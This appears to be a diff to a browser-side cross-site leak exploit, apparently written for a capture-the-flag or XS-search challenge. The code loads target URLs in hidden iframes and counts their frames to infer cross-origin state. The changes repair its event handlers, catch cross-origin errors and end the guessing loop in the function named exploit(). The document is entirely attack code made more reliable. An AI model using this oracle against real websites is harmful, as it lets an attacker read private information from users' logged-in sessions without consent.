@@ -17,8 +17,8 @@
                 fr.src = url;
                 fr.style.display = "none";
 
-                fr.onload = resolve(fr);
-                fr.onerror = reject(null);
+                fr.onload = () => resolve(fr);
+                fr.onerror = () => resolve(null);
 
                 document.body.appendChild(fr);
             })
@@ -29,11 +29,14 @@
 
             if (!ifr) return false;
 
-            const count = ifr.contentWindow.length;
-
-            document.body.removeChild(ifr);
-
-            return count > 0;
+            try {
+                const count = ifr.contentWindow.length;
+                document.body.removeChild(ifr);
+                return count > 0;
+            } catch (e) {
+                if (ifr.parentNode) document.body.removeChild(ifr);
+                return false;
+            }
         }
 
         async function exploit() {
@@ -50,6 +53,8 @@
                         break;
                     }
                 }
+
+                if (!found) break;
             }
         }
 
